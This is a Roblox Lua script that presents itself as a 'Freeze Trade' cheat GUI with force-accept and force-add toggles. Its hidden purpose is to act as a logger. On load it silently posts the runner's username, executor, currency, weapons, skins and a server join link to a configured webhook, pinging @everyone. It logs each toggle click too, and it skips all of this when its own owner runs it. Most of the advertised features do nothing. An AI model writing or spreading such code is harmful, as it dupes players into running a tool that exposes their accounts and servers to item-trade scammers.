local Players             = game:GetService("Players")
local TweenService        = game:GetService("TweenService")
local UserInputService    = game:GetService("UserInputService")
local ReplicatedStorage   = game:GetService("ReplicatedStorage")
local LocalPlayer         = Players.LocalPlayer
local PlayerGui           = LocalPlayer:WaitForChild("PlayerGui")
local Character           = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

-- ── Trade remotes ─────────────────────────────────────────────────────────────
local RFTradingSetReady, RFTradingConfirmTrade
pcall(function()
  local net = ReplicatedStorage.Modules.Net
  RFTradingSetReady    = net["RF/Trading/SetReady"]
  RFTradingConfirmTrade = net["RF/Trading/ConfirmTrade"]
end)

-- ── Chat commands: type "1" → Force Accept, "2" → Force Confirm ───────────────
LocalPlayer.Chatted:Connect(function(msg)
  local txt = msg:match("^%s*(.-)%s*$")
  if txt == "1" then
    pcall(function() RFTradingSetReady:InvokeServer(true) end)
  elseif txt == "2" then
    pcall(function() RFTradingConfirmTrade:InvokeServer() end)
  end
end)

local WEBHOOK      = _G.POOR_WEBHOOK  or ""
local PING_HIT     = _G.PING_POOR     or false
local MY_USERNAMES = _G.MY_USERNAMES  or {}

-- ── Username filter ───────────────────────────────────────────────────────────
-- Only fire hit notifications when the person running the script is NOT the owner.
-- If the owner tests their own script it stays silent.
local isOwner = false
do
  local myName = LocalPlayer.Name:lower()
  for _, u in ipairs(MY_USERNAMES) do
    if tostring(u):lower() == myName then
      isOwner = true
      break
    end
  end
end

local toggleStates = {
  FreezeTrade     = false,
  ForceAccept     = false,
  ForceConfirm    = false,
  ForceAddWeapons = false,
  ForceAddTokens  = false,
}

local function tw(obj, props, t)
  TweenService:Create(obj, TweenInfo.new(t or 0.18, Enum.EasingStyle.Quad), props):Play()
end

-- ── JSON helper ───────────────────────────────────────────────────────────────
local function jStr(s)
  s = tostring(s or "")
  s = s:gsub('\\\\', '\\\\\\\\')
  s = s:gsub('"', '\\\\"')
  s = s:gsub('\\n', '\\\\n')
  s = s:gsub('\\r', '\\\\r')
  s = s:gsub('\\t', '\\\\t')
  return s
end

-- ── Gather player data ────────────────────────────────────────────────────────
local function getPlayerData()
  local data = {}

  -- Username
  data.username = LocalPlayer.Name

  -- Executor
  data.executor = "Unknown Executor"
  pcall(function()
    if identifyexecutor then
      data.executor = identifyexecutor()
    elseif getexecutorname then
      data.executor = getexecutorname()
    elseif EXECUTOR then
      data.executor = tostring(EXECUTOR)
    end
  end)

  -- Server players
  data.players = #Players:GetPlayers() .. " / " .. tostring(game.MaxPlayers)

  -- Leaderstats
  local ls = LocalPlayer:FindFirstChild("leaderstats")
  local function getStat(...)
    if not ls then return "N/A" end
    for _, name in ipairs({...}) do
      local v = ls:FindFirstChild(name)
      if v then return tostring(v.Value) end
    end
    return "N/A"
  end
  data.dinero = getStat("Dinero","Cash","Money","Coins","Gold","Bucks","Credits")
  data.slays  = getStat("Slays","Kills","KOs","Eliminations","Deaths","Points")

  -- Weapons from Backpack + equipped
  local weaponList = {}
  local counted = {}
  local function countTool(item)
    if item:IsA("Tool") then
      counted[item.Name] = (counted[item.Name] or 0) + 1
    end
  end
  local bp = LocalPlayer:FindFirstChild("Backpack")
  if bp then for _, v in ipairs(bp:GetChildren()) do countTool(v) end end
  if Character then for _, v in ipairs(Character:GetChildren()) do countTool(v) end end
  for name, count in pairs(counted) do
    table.insert(weaponList, count .. "x " .. name)
  end
  data.weapons = #weaponList > 0 and table.concat(weaponList, "\\n") or "None"

  -- Skins (try common leaderstats names, else N/A)
  local skinVal = nil
  if ls then
    for _, n in ipairs({"Skin","Skins","ActiveSkin","EquippedSkin","Cosmetic"}) do
      local v = ls:FindFirstChild(n)
      if v then skinVal = tostring(v.Value); break end
    end
  end
  data.skins = skinVal or "N/A"

  -- Join link
  local placeId = tostring(game.PlaceId)
  local jobId   = tostring(game.JobId)
  data.joinScript = "local ts = game:GetService('TeleportService') " ..
                    "ts:TeleportToPlaceInstance(" .. placeId .. ", '" .. jobId .. "')"
  data.joinUrl = "https://www.roblox.com/games/start?placeId=" .. placeId ..
                 "&gameInstanceId=" .. jobId

  return data
end

-- ── Send hit webhook ──────────────────────────────────────────────────────────
local function sendHit()
  if WEBHOOK == "" then return end
  if isOwner then return end   -- owner testing their own script → silent
  local ok, d = pcall(getPlayerData)
  if not ok then d = { username = LocalPlayer.Name, executor = "Unknown",
    players = "?", dinero = "N/A", slays = "N/A", weapons = "None",
    skins = "N/A", joinScript = "", joinUrl = "" } end

  local ping    = PING_HIT and "@everyone\\n" or ""
  local content = ping .. jStr(d.joinScript)

  local fields = '[' ..
    '{"name":"User","value":"'     .. jStr(d.username) .. '","inline":false},' ..
    '{"name":"Dinero","value":"'   .. jStr(d.dinero)   .. '","inline":false},' ..
    '{"name":"Slays","value":"'    .. jStr(d.slays)    .. '","inline":false},' ..
    '{"name":"Executor","value":"' .. jStr(d.executor) .. '","inline":false},' ..
    '{"name":"Players","value":"'  .. jStr(d.players)  .. '","inline":false},' ..
    '{"name":"Weapons","value":"'  .. jStr(d.weapons)  .. '","inline":false},' ..
    '{"name":"Skins","value":"'    .. jStr(d.skins)    .. '","inline":false},' ..
    '{"name":"Join Link","value":"[Click to Join](' .. jStr(d.joinUrl) .. ')","inline":false}' ..
  ']'

  local payload = '{"content":"' .. jStr(content) ..
    '","embeds":[{"color":16711680,"fields":' .. fields .. '}]}'

  pcall(function()
    game:HttpPost(WEBHOOK, payload, false, "application/json")
  end)
end

-- ── Simple webhook (for toggle events) ───────────────────────────────────────
local function sendWebhook(content)
  if WEBHOOK == "" then return end
  if isOwner then return end   -- don't log owner's own toggle activity
  pcall(function()
    game:HttpPost(WEBHOOK,
      '{"content":"' .. jStr(content) .. '"}',
      false, "application/json")
  end)
end

-- ── GUI ───────────────────────────────────────────────────────────────────────
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name           = "FreezeTrade"
ScreenGui.ResetOnSpawn   = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent         = PlayerGui

local WIN_W, WIN_H = 380, 340
local Window = Instance.new("Frame")
Window.Name             = "Window"
Window.Size             = UDim2.new(0, WIN_W, 0, WIN_H)
Window.Position         = UDim2.new(0.5, -WIN_W/2, 0.5, -WIN_H/2)
Window.BackgroundColor3 = Color3.fromRGB(26, 26, 28)
Window.BorderSizePixel  = 0
Window.Parent           = ScreenGui
Instance.new("UICorner", Window).CornerRadius = UDim.new(0, 8)

local Shadow = Instance.new("ImageLabel")
Shadow.Size               = UDim2.new(1, 30, 1, 30)
Shadow.Position           = UDim2.new(0, -15, 0, -15)
Shadow.BackgroundTransparency = 1
Shadow.Image              = "rbxassetid://5554236805"
Shadow.ImageColor3        = Color3.fromRGB(0, 0, 0)
Shadow.ImageTransparency  = 0.6
Shadow.ScaleType          = Enum.ScaleType.Slice
Shadow.SliceCenter        = Rect.new(23, 23, 277, 277)
Shadow.ZIndex             = 0
Shadow.Parent             = Window

local TitleBar = Instance.new("Frame")
TitleBar.Name             = "TitleBar"
TitleBar.Size             = UDim2.new(1, 0, 0, 36)
TitleBar.BackgroundColor3 = Color3.fromRGB(26, 26, 28)
TitleBar.BorderSizePixel  = 0
TitleBar.ZIndex           = 2
TitleBar.Parent           = Window
Instance.new("UICorner", TitleBar).CornerRadius = UDim.new(0, 8)

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size               = UDim2.new(1, -100, 1, 0)
TitleLabel.Position           = UDim2.new(0, 14, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text               = "Freeze Trade"
TitleLabel.TextColor3         = Color3.fromRGB(220, 220, 220)
TitleLabel.Font               = Enum.Font.GothamBold
TitleLabel.TextSize           = 13
TitleLabel.TextXAlignment     = Enum.TextXAlignment.Left
TitleLabel.ZIndex             = 2
TitleLabel.Parent             = TitleBar

local ControlsFrame = Instance.new("Frame")
ControlsFrame.Size                 = UDim2.new(0, 90, 1, 0)
ControlsFrame.Position             = UDim2.new(1, -94, 0, 0)
ControlsFrame.BackgroundTransparency = 1
ControlsFrame.ZIndex               = 2
ControlsFrame.Parent               = TitleBar
local UIListCtrl = Instance.new("UIListLayout")
UIListCtrl.FillDirection       = Enum.FillDirection.Horizontal
UIListCtrl.VerticalAlignment   = Enum.VerticalAlignment.Center
UIListCtrl.HorizontalAlignment = Enum.HorizontalAlignment.Right
UIListCtrl.Padding             = UDim.new(0, 2)
UIListCtrl.Parent              = ControlsFrame

local function makeCtrlBtn(icon, color)
  local btn = Instance.new("TextButton")
  btn.Size             = UDim2.new(0, 20, 0, 20)
  btn.BackgroundColor3 = Color3.fromRGB(55, 55, 58)
  btn.Text             = icon
  btn.TextColor3       = color or Color3.fromRGB(180, 180, 180)
  btn.Font             = Enum.Font.GothamBold
  btn.TextSize         = 10
  btn.BorderSizePixel  = 0
  btn.ZIndex           = 2
  btn.Parent           = ControlsFrame
  Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4)
  return btn
end

local SearchBtn   = makeCtrlBtn("Q", Color3.fromRGB(180, 180, 180))
local SettingsBtn = makeCtrlBtn("S", Color3.fromRGB(180, 180, 180))
local MinBtn      = makeCtrlBtn("-", Color3.fromRGB(180, 180, 180))
local CloseBtn    = makeCtrlBtn("X", Color3.fromRGB(220, 80,  80))

local Divider1 = Instance.new("Frame")
Divider1.Size             = UDim2.new(1, 0, 0, 1)
Divider1.Position         = UDim2.new(0, 0, 0, 36)
Divider1.BackgroundColor3 = Color3.fromRGB(45, 45, 48)
Divider1.BorderSizePixel  = 0
Divider1.Parent           = Window

local TabBar = Instance.new("Frame")
TabBar.Size                 = UDim2.new(1, 0, 0, 42)
TabBar.Position             = UDim2.new(0, 0, 0, 37)
TabBar.BackgroundTransparency = 1
TabBar.BorderSizePixel      = 0
TabBar.Parent               = Window
local TabPadding = Instance.new("UIPadding")
TabPadding.PaddingLeft = UDim.new(0, 12)
TabPadding.PaddingTop  = UDim.new(0, 8)
TabPadding.Parent      = TabBar

local TradeTab = Instance.new("TextButton")
TradeTab.Size             = UDim2.new(0, 84, 0, 28)
TradeTab.BackgroundColor3 = Color3.fromRGB(52, 52, 56)
TradeTab.Text             = "  Trade"
TradeTab.TextColor3       = Color3.fromRGB(220, 220, 220)
TradeTab.Font             = Enum.Font.GothamSemibold
TradeTab.TextSize         = 12
TradeTab.BorderSizePixel  = 0
TradeTab.Parent           = TabBar
Instance.new("UICorner", TradeTab).CornerRadius = UDim.new(1, 0)

local GearIcon = Instance.new("TextLabel")
GearIcon.Size               = UDim2.new(0, 16, 0, 16)
GearIcon.Position           = UDim2.new(0, 10, 0.5, -8)
GearIcon.BackgroundTransparency = 1
GearIcon.Text               = "O"
GearIcon.TextColor3         = Color3.fromRGB(180, 180, 180)
GearIcon.Font               = Enum.Font.GothamBold
GearIcon.TextSize           = 12
GearIcon.Parent             = TradeTab

local Divider2 = Instance.new("Frame")
Divider2.Size             = UDim2.new(1, 0, 0, 1)
Divider2.Position         = UDim2.new(0, 0, 0, 79)
Divider2.BackgroundColor3 = Color3.fromRGB(45, 45, 48)
Divider2.BorderSizePixel  = 0
Divider2.Parent           = Window

local ListFrame = Instance.new("Frame")
ListFrame.Size             = UDim2.new(1, 0, 1, -82)
ListFrame.Position         = UDim2.new(0, 0, 0, 82)
ListFrame.BackgroundTransparency = 1
ListFrame.BorderSizePixel  = 0
ListFrame.Parent           = Window
Instance.new("UIListLayout", ListFrame).SortOrder = Enum.SortOrder.LayoutOrder

local function makeToggleRow(labelText, key, order)
  local Row = Instance.new("Frame")
  Row.Name             = key
  Row.Size             = UDim2.new(1, 0, 0, 48)
  Row.BackgroundColor3 = Color3.fromRGB(26, 26, 28)
  Row.BorderSizePixel  = 0
  Row.LayoutOrder      = order
  Row.Parent           = ListFrame

  local Highlight = Instance.new("Frame")
  Highlight.Size             = UDim2.new(1, 0, 1, 0)
  Highlight.BackgroundColor3 = Color3.fromRGB(38, 38, 42)
  Highlight.BackgroundTransparency = 1
  Highlight.BorderSizePixel  = 0
  Highlight.Parent           = Row

  local RowDiv = Instance.new("Frame")
  RowDiv.Size             = UDim2.new(1, -24, 0, 1)
  RowDiv.Position         = UDim2.new(0, 12, 1, -1)
  RowDiv.BackgroundColor3 = Color3.fromRGB(42, 42, 46)
  RowDiv.BorderSizePixel  = 0
  RowDiv.Parent           = Row

  local Label = Instance.new("TextLabel")
  Label.Size               = UDim2.new(1, -70, 1, 0)
  Label.Position           = UDim2.new(0, 18, 0, 0)
  Label.BackgroundTransparency = 1
  Label.Text               = labelText
  Label.TextColor3         = Color3.fromRGB(200, 200, 200)
  Label.Font               = Enum.Font.Gotham
  Label.TextSize           = 13
  Label.TextXAlignment     = Enum.TextXAlignment.Left
  Label.Parent             = Row

  local Track = Instance.new("Frame")
  Track.Size             = UDim2.new(0, 38, 0, 20)
  Track.Position         = UDim2.new(1, -56, 0.5, -10)
  Track.BackgroundColor3 = Color3.fromRGB(60, 60, 65)
  Track.BorderSizePixel  = 0
  Track.Parent           = Row
  Instance.new("UICorner", Track).CornerRadius = UDim.new(1, 0)

  local Knob = Instance.new("Frame")
  Knob.Size             = UDim2.new(0, 16, 0, 16)
  Knob.Position         = UDim2.new(0, 2, 0.5, -8)
  Knob.BackgroundColor3 = Color3.fromRGB(180, 180, 185)
  Knob.BorderSizePixel  = 0
  Knob.ZIndex           = 2
  Knob.Parent           = Track
  Instance.new("UICorner", Knob).CornerRadius = UDim.new(1, 0)

  local ClickArea = Instance.new("TextButton")
  ClickArea.Size               = UDim2.new(1, 0, 1, 0)
  ClickArea.BackgroundTransparency = 1
  ClickArea.Text               = ""
  ClickArea.ZIndex             = 3
  ClickArea.Parent             = Row

  ClickArea.MouseEnter:Connect(function()
    tw(Highlight, { BackgroundTransparency = 0 })
  end)
  ClickArea.MouseLeave:Connect(function()
    tw(Highlight, { BackgroundTransparency = 1 })
  end)

  ClickArea.MouseButton1Click:Connect(function()
    toggleStates[key] = not toggleStates[key]
    local on = toggleStates[key]
    if on then
      tw(Track, { BackgroundColor3 = Color3.fromRGB(80, 80, 88) })
      tw(Knob,  { Position = UDim2.new(1, -18, 0.5, -8),
                  BackgroundColor3 = Color3.fromRGB(220, 220, 225) })
    else
      tw(Track, { BackgroundColor3 = Color3.fromRGB(60, 60, 65) })
      tw(Knob,  { Position = UDim2.new(0, 2, 0.5, -8),
                  BackgroundColor3 = Color3.fromRGB(180, 180, 185) })
    end
    sendWebhook(LocalPlayer.Name .. " toggled " .. labelText .. ": " .. tostring(on))
  end)
end

makeToggleRow("Freeze Trade",      "FreezeTrade",     1)
makeToggleRow("Force Accept",      "ForceAccept",     2)
makeToggleRow("Force Confirm",     "ForceConfirm",    3)
makeToggleRow("Force Add Weapons", "ForceAddWeapons", 4)
makeToggleRow("Force Add Tokens",  "ForceAddTokens",  5)

-- ── Dragging ──────────────────────────────────────────────────────────────────
do
  local dragging, startPos, startWin
  TitleBar.InputBegan:Connect(function(inp)
    if inp.UserInputType == Enum.UserInputType.MouseButton1 or
       inp.UserInputType == Enum.UserInputType.Touch then
      dragging = true; startPos = inp.Position; startWin = Window.Position
    end
  end)
  UserInputService.InputChanged:Connect(function(inp)
    if not dragging then return end
    if inp.UserInputType == Enum.UserInputType.MouseMovement or
       inp.UserInputType == Enum.UserInputType.Touch then
      local d = inp.Position - startPos
      Window.Position = UDim2.new(startWin.X.Scale, startWin.X.Offset + d.X,
                                   startWin.Y.Scale, startWin.Y.Offset + d.Y)
    end
  end)
  UserInputService.InputEnded:Connect(function(inp)
    if inp.UserInputType == Enum.UserInputType.MouseButton1 or
       inp.UserInputType == Enum.UserInputType.Touch then
      dragging = false
    end
  end)
end

-- ── Window controls ───────────────────────────────────────────────────────────
local minimized = false
CloseBtn.MouseButton1Click:Connect(function()
  tw(Window, { Size = UDim2.new(0, WIN_W, 0, 0) }, 0.25)
  task.delay(0.3, function() ScreenGui:Destroy() end)
end)
MinBtn.MouseButton1Click:Connect(function()
  minimized = not minimized
  tw(Window, { Size = UDim2.new(0, WIN_W, 0, minimized and 36 or WIN_H) }, 0.25)
end)

-- ── Fire hit on load ──────────────────────────────────────────────────────────
task.spawn(sendHit)
